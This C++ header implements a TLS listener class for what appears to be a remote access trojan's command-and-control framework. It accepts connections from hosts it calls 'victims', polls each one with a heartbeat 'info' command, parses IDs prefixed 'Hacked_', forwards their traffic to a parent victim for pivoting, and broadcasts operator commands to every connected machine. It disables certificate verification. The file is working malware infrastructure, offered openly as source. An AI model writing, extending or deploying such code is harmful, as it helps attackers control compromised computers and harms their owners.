#pragma once

#include <iostream>
#include <cstring>
#include <unistd.h>
#include <arpa/inet.h>
#include <thread>
#include <vector>
#include <memory>
#include <algorithm>
#include <atomic>
#include <unordered_map>
#include <mutex>

// OpenSSL
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/pkcs12.h>

// Module
#include "clsLtn.hpp"
#include "clsEDP.hpp"
#include "clsTools.hpp"
#include "clsVictim.hpp"
#include "clsDebugTools.hpp"

class clsLtnTls : public clsLtn
{
private:
    int m_nSktSrv = -1;
    int m_nPort   = 0;

    SSL_CTX* m_sslCtx = nullptr;

    std::shared_ptr<clsVictim> m_vicParent = nullptr;

    std::vector<std::shared_ptr<clsVictim>> m_vVictim;
    std::mutex m_vVictimMutex;

    std::vector<uint8_t> m_abCert;
    std::string m_szPassword;

    std::atomic<bool> m_bIsRunning { false };

    struct stHeartbeatCtx
    {
        std::atomic<bool> running { true };
        std::thread th;
    };

    std::unordered_map<std::shared_ptr<clsVictim>, std::shared_ptr<stHeartbeatCtx>> m_heartbeatMap;
    std::mutex m_heartbeatMutex;

public:
    clsLtnTls() = default;

    clsLtnTls(std::shared_ptr<clsVictim> victim, int nPort)
        : m_vicParent(victim), m_nPort(nPort)
    {
        m_nSktSrv = socket(AF_INET, SOCK_STREAM, 0);
        if (m_nSktSrv < 0)
            throw std::runtime_error("socket failed");

        int opt = 1;
        setsockopt(m_nSktSrv, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

        sockaddr_in srv {};
        srv.sin_family = AF_INET;
        srv.sin_port   = htons(nPort);
        srv.sin_addr.s_addr = INADDR_ANY;

        if (bind(m_nSktSrv, (sockaddr*)&srv, sizeof(srv)) < 0)
            throw std::runtime_error("bind failed");
    }

    ~clsLtnTls()
    {
        //fnStop();
    }

    void fnSetCertificate(const std::vector<uint8_t>& pfxData, const std::string& szPassword)
    {
        m_abCert = pfxData;
        m_szPassword = szPassword;
    }

    void fnStart() override
    {
        if (m_bIsRunning)
            return;

        m_sslCtx = fnInitTlsFromMemory(m_abCert, m_szPassword);
        if (!m_sslCtx)
        {
            clsTools::fnLogErr("TLS ctx init failed");
            return;
        }

        if (listen(m_nSktSrv, 128) < 0)
        {
            clsTools::fnLogErr("listen failed");
            return;
        }

        clsTools::fnLogInfo("TLS listener started");
        m_bIsRunning = true;

        while (m_bIsRunning)
        {
            sockaddr_in clnt {};
            socklen_t len = sizeof(clnt);

            int skt = accept(m_nSktSrv, (sockaddr*)&clnt, &len);
            if (skt < 0)
                continue;

            SSL* ssl = SSL_new(m_sslCtx);
            SSL_set_fd(ssl, skt);

            if (SSL_accept(ssl) <= 0)
            {
                ERR_print_errors_fp(stderr);
                SSL_free(ssl);
                close(skt);
                continue;
            }

            auto victim = std::make_shared<clsVictim>(
                clsVictim::enMethod::TLS, skt, ssl);

            {
                std::lock_guard<std::mutex> lock(m_vVictimMutex);
                m_vVictim.push_back(victim);
            }

            std::thread(&clsLtnTls::fnHandler, this, victim, ssl).detach();
        }
    }

    void fnStop() override
    {
        if (!m_bIsRunning)
            return;

        m_bIsRunning = false;

        if (m_nSktSrv >= 0)
        {
            close(m_nSktSrv);
            m_nSktSrv = -1;
        }

        if (m_sslCtx)
        {
            SSL_CTX_free(m_sslCtx);
            m_sslCtx = nullptr;
        }

        clsTools::fnLogInfo("TLS listener stopped");
    }

    void fnSendToSub(std::string& szSubID, std::vector<std::string>& vuMsg) override
    {
        std::lock_guard<std::mutex> lock(m_vVictimMutex);
        for (auto& victim : m_vVictim)
        {
            victim->fnSendCommand(vuMsg, true);
        }
    }

private:
    void fnHandler(std::shared_ptr<clsVictim> victim, SSL* ssl)
    {
        try
        {
            clsTools::fnLogInfo("TLS client connected");

            std::vector<unsigned char> staticBuf(clsEDP::MAX_SIZE);
            std::vector<unsigned char> dynBuf;

            auto hb = std::make_shared<stHeartbeatCtx>();
            std::weak_ptr<clsVictim> wvictim = victim;
            hb->th = std::thread([this, wvictim, hb]() 
            {
                while (hb->running)
                {
                    auto v = wvictim.lock();
                    if (!v) {
                        break;
                    }

                    try {
                        STRLIST ls = { "info" };
                        v->fnSendCommand(ls, true);
                    }
                    catch (...) {
                        break;
                    }

                    std::this_thread::sleep_for(std::chrono::seconds(1));
                }
            });

            while (m_bIsRunning)
            {
                int r = SSL_read(ssl, staticBuf.data(), staticBuf.size());
                if (r <= 0)
                    break;

                dynBuf.insert(dynBuf.end(), staticBuf.begin(),
                              staticBuf.begin() + r);

                while (dynBuf.size() >= clsEDP::HEADER_SIZE)
                {
                    auto [cmd, param, len] = clsEDP::fnGetHeader(dynBuf);
                    if (dynBuf.size() < clsEDP::HEADER_SIZE + len)
                        break;

                    clsEDP edp(dynBuf);
                    dynBuf = edp.fnGetMoreData();

                    auto [c, p, l, msg] = edp.fnGetMsg();
                    std::string payload(msg.begin(), msg.end());

                    auto decoded = clsEZData::fnvsB64ToVectorStringParser(payload);

                    std::vector<std::string> vuVictim;
                    std::vector<std::string> vsMsg;
                    for (int i = 0; i < decoded.size(); i++)
                    {
                        if (decoded[i].rfind("Hacked_", 0) == 0)
                            vuVictim.push_back(decoded[i]);
                        else
                        {
                            vsMsg.reserve(decoded.size() - i - 1);
                            vsMsg.insert(vsMsg.end(), decoded.begin() + i, decoded.end());
                            break;
                        }
                    }

                    if (vsMsg[0] == "info")
                        victim->m_szVictimID = vsMsg[4];

                    m_vicParent->fnSendCommand(decoded);
                }
            }
        }
        catch (...)
        {
        }

        SSL_shutdown(ssl);
        SSL_free(ssl);
        close(victim->m_nSkt);

        {
            std::lock_guard<std::mutex> lock(m_vVictimMutex);
            m_vVictim.erase(
                std::remove(m_vVictim.begin(), m_vVictim.end(), victim),
                m_vVictim.end());
        }

        clsTools::fnLogInfo("TLS client disconnected");
    }

    SSL_CTX* fnInitTlsFromMemory(const std::vector<uint8_t>& pfxData, const std::string& pfxPassword)
    {
        // OpenSSL auto-init (1.1.0+)
        SSL_CTX* ctx = SSL_CTX_new(TLS_server_method());
        if (!ctx)
        {
            ERR_print_errors_fp(stderr);
            return nullptr;
        }

        // Load PKCS#12 from memory
        BIO* bio = BIO_new_mem_buf(pfxData.data(), (int)pfxData.size());
        if (!bio)
        {
            ERR_print_errors_fp(stderr);
            SSL_CTX_free(ctx);
            return nullptr;
        }

        PKCS12* p12 = d2i_PKCS12_bio(bio, nullptr);
        if (!p12)
        {
            ERR_print_errors_fp(stderr);
            BIO_free(bio);
            SSL_CTX_free(ctx);
            return nullptr;
        }

        EVP_PKEY* pkey = nullptr;
        X509* cert = nullptr;
        STACK_OF(X509)* ca = nullptr;

        if (!PKCS12_parse(
                p12,
                pfxPassword.c_str(),
                &pkey,
                &cert,
                &ca))
        {
            ERR_print_errors_fp(stderr);
            PKCS12_free(p12);
            BIO_free(bio);
            SSL_CTX_free(ctx);
            return nullptr;
        }

        // Apply certificate and key
        if (SSL_CTX_use_certificate(ctx, cert) != 1 ||
            SSL_CTX_use_PrivateKey(ctx, pkey) != 1)
        {
            ERR_print_errors_fp(stderr);
            EVP_PKEY_free(pkey);
            X509_free(cert);
            sk_X509_pop_free(ca, X509_free);
            PKCS12_free(p12);
            BIO_free(bio);
            SSL_CTX_free(ctx);
            return nullptr;
        }

        // Optional: add CA chain
        if (ca)
        {
            for (int i = 0; i < sk_X509_num(ca); i++)
            {
                X509* cacert = sk_X509_value(ca, i);
                SSL_CTX_add_extra_chain_cert(ctx, X509_dup(cacert));
            }
        }

        // TLS settings
        SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);
        SSL_CTX_set_mode(ctx, SSL_MODE_AUTO_RETRY);

        // Cleanup temporary objects
        EVP_PKEY_free(pkey);
        X509_free(cert);
        sk_X509_pop_free(ca, X509_free);
        PKCS12_free(p12);
        BIO_free(bio);

        return ctx;
    }
};